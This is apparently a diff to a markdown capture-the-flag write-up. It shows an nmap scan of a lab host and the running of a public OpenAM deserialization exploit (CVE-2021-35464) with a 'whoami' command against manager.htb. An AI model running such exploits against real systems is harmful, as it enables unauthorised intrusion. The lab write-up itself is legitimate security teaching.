@@ -3,6 +3,7 @@
 
 By doing a quick scan we can notice an Apache Tomcat on port 8080.
 ```
+# nmap -sCV -p- 10.129.172.131
 Nmap scan report for 10.129.172.131
 [...]
 Host is up (0.19s latency).                                                                                                                                              
@@ -17,7 +18,7 @@ This version of OpenAM is vulnerable to a deserialization attack.
 The exploit can be found [here](https://www.exploit-db.com/exploits/50131).
 
 ```
-Mon Jul 26 22:31:45 wil@pwn:~/htb/business_ctf/boxes/manager$ python3 CVE-2021-35464.py -c whoami
+$ python3 CVE-2021-35464.py -c whoami
 [?] Please enter the URL [http://192.168.0.100:7080/openam] : http://manager.htb:8080/openam/
 [!] Verifying reachability of http://manager.htb:8080/openam/
 [+] Endpoint http://manager.htb:8080/openam/ reachable
